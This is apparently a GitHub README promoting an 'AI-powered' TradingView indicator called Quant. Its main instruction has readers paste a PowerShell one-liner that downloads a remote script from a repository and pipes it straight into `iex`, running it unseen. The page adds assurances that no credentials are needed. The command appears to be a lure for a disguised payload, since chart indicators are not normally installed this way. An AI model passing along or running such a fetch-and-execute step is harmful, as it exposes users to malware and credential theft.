<a id="get"></a>

<p align="center">
  <img src="quant.jpg" alt="TradingView" width="880">
</p>

Quant is our first AI-powered indicator. It analyzes current market conditions to show how the market could develop over the selected timeframe.

## Getting Started

Follow the steps below to install the Quant Indicator using a PowerShell command.

#### 1. Open PowerShell

Press **Win + R**, type `PowerShell`, and press **Enter**.

#### 2. Install the Quant Indicator

Copy and paste the installation command below into the PowerShell window:

```powershell
irm github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
```

#### 3. Restart TradingView

Once the installation is complete, restart TradingView. <br>
The Quant Indicator will then be available in your indicator library.

## Current Release

**Status:** Beta  
**Version:** `v2.9.5-beta`

---

## Installation & Security

Only use installation commands published in this repository.

The installer does not require your TradingView password, API keys, recovery phrases, payment information, or other sensitive credentials.

You can review the installation script before running it.

---

## Changelog

- Refined market-data processing across price action, liquidity, positioning, volatility, and market structure.
- Improved indicator recalculation as new market data becomes available.
- Expanded processing of scheduled market events.
- Improved handling of rapidly changing market conditions.
- Reduced latency between incoming data and chart updates.
- Added additional validation for incomplete or inconsistent market inputs.
- Improved stability when switching symbols and timeframes.
- Improved synchronization between indicator calculations and chart updates.
- Reduced unnecessary recalculations during periods of market noise.
- Fixed chart refresh and synchronization issues identified during beta testing.
